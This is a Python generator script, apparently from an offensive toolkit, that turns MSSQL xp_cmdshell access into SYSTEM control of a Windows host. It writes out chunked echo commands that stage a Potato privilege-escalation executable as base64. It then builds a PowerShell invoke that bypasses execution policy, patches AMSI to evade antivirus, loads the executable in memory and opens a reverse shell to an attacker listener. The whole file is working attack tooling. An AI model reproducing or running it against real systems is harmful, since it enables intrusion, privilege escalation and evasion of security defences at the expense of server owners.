#!/usr/bin/env python3
"""Variant B -- no-network FILELESS.
Stage the Potato exe's bytes as base64 through xp_cmdshell (chunked echo), then ONE fileless invoke line
(AMSI byte-patch + FromBase64String + Assembly::Load + revshell-as-SYSTEM). The exe never touches disk.
Edit LHOST/LPORT/TOOL in _winpriv_common.py.

Usage: python3 gen_nonet.py /path/to/<TOOL>.exe   (defaults to ./<TOOL>)
"""
import base64, sys
import _winpriv_common as P

_a = sys.argv[1:]
STAGE = (_a[_a.index("--stagedir") + 1] if "--stagedir" in _a else P.STAGE).rstrip("\\")
_pos  = [a for i, a in enumerate(_a) if not a.startswith("--") and (i == 0 or _a[i-1] != "--stagedir")]
SRC   = _pos[0] if _pos else P.TOOL
B64F  = f"{STAGE}\\g.b64"                  # transient text file holding the exe's base64  (--stagedir overrides)
CHUNK = 6000                               # < 8191 cmd-line limit, headroom for the wrapper

arr = P.ps_argv_literal(P.TOOL)
load = (f"$g=[Convert]::FromBase64String((Get-Content '{B64F}'));"
        f"$x=[Reflection.Assembly]::Load($g);"
        f"$x.EntryPoint.Invoke($null,@(,[string[]]@({arr})));"
        f"Remove-Item '{B64F}'")
invoke_b64 = P.utf16b64(P.AMSI + load)

data = base64.b64encode(P.read_tool(SRC)).decode()
nch  = (len(data) + CHUNK - 1) // CHUNK
print(f"-- tool={P.TOOL}  revshell={P.LHOST}:{P.LPORT}  (start `nc -lvnp {P.LPORT}` first)")
print(f"-- STEP 1: stage {SRC} ({len(data)} b64 chars) -> {B64F} in {nch} chunk(s). Run IN ORDER:")
for i in range(0, len(data), CHUNK):
    op = ">" if i == 0 else ">>"           # first creates, rest append
    print(f"EXEC master..xp_cmdshell 'echo {data[i:i+CHUNK]}{op}{B64F}';")
print(f"\n-- STEP 2: fileless invoke (AMSI patch + Load(FromBase64) + revshell-as-SYSTEM; deletes the .b64):")
print(f"EXEC master..xp_cmdshell 'powershell -ep bypass -e {invoke_b64}';")
print(f"\n-- (chunks: {nch}  |  invoke b64 len: {len(invoke_b64)})")
